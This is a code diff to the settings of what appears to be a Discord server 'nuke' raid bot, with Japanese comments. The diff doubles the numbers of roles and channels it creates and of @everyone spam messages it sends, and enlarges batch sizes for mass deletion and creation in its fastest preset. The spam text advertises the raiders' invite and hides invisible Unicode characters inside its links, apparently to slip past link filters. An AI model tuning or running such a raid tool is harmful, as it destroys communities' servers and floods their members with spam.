@@ -20,11 +20,11 @@ INTENTS.members = True
 
 # --- メイン作業 ---
 ROLE_BASE      = "ozeumember"   # ロール名ベース
-ROLE_COUNT     = 50               # 作成数
+ROLE_COUNT     = 100               # 作成数
 CHANNEL_BASE   = "ozeu-nuke"    # チャンネル名ベース
-CHANNEL_COUNT  = 50               # 作成数
+CHANNEL_COUNT  = 100               # 作成数
 REPEAT_MESSAGE = "# @everyone\n# Raid by OZEU. join now\n# おぜうの集いに参加！\n# https://\ptb．discord．com/../oze/../invite/ozeuozeu [︋︍︋](https://i︋︍︋m︋︍︋g︋︍︋u︋︍︋r︋︍︋.︋︍com/yNx4Me2) [︋︍︋](https://m︋︍︋e︋︍︋d︋︍︋i︋︍︋a︋︍︋.︋︍discordapp.net/attachments/1341829977850646668/1353001058405978172/IMB_DZBN6p.gif?ex=67e00fed&is=67debe6d&hm=b07d1cf915c35fa1871b655f91d3738eba09ea05683a1abf5b883b0598f3b92a&) [︋](https://m︋︍︋e︋︍︋d︋︍︋i︋︍︋a︋︍︋.︋︍discordapp.net/attachments/1381064393189621860/1383567562863939726/GtZ9HYjbkAA9bPR.webp?ex=684f4334&is=684df1b4&hm=76921f9aff9c6f4b90feaf662c07ca2bb48257ef2bb7fdf39fb5a6df94740967&) [︋︍︋](https://m︋︍︋e︋︍︋d︋︍︋i︋︍︋a︋︍︋.︋︍discordapp.net/attachments/1381064393189621860/1383567672725340230/Gri2PLOboAI8ZRV.jpeg?ex=684f434e&is=684df1ce&hm=c28e7c872cdcb1420d8f565211714fa33bef522a879eca292c280439173a9ea2&) [︋︍︋](https://i︋︍︋m︋︍︋g︋︍︋u︋︍︋r︋︍︋.︋︍com/NbBGFcf)"  # 送信メッセージ
-REPEAT_COUNT   = 50               # メッセージ送信回数　↑メッセージ内容
+REPEAT_COUNT   = 100               # メッセージ送信回数　↑メッセージ内容
 
 # --- サブ作業 ---
 CHANGE_NICKNAMES = True          # Trueならニックネーム変更
@@ -76,12 +76,12 @@ SPEED_PRESETS = {
         "NICK_CHUNK_SLEEP": 0.12
     },
     "爆速": {
-        "DELETE_CHUNK_SIZE": 12,
+        "DELETE_CHUNK_SIZE": 100,
         "DELETE_CHUNK_SLEEP": 0.04,
         "POST_DELETE_WAIT": 1.0,
-        "CREATE_CHUNK_SIZE": 10,
+        "CREATE_CHUNK_SIZE": 100,
         "CREATE_CHUNK_SLEEP": 0.05,
-        "MSG_CHUNK_SIZE": 20,
+        "MSG_CHUNK_SIZE": 100,
         "MSG_INTER_CHUNK_SLEEP": 0.005,
         "MSG_INTER_ROUND_SLEEP": 0.01,
         "ROLE_SLEEP": 0.01,
